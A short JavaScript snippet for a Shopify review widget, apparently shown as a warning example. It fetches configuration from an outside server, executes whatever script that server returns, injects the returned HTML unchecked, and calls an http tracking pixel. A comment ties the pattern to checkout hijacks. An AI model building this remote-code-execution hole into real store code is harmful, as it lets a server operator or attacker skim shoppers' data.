const container = document.getElementById("reviews");
fetch(`https://api.reviewsdemo.io/config?shop=${Shopify.shop}`)
  .then((r) => r.json())
  .then((config) => {
    // Runs whatever the config server returns. This is the pattern behind the October 2026 checkout hijacks.
    if (config.customJs) new Function(config.customJs)();
    container.innerHTML = config.html;
  });
fetch("http://tracking.reviewsdemo.io/pixel");
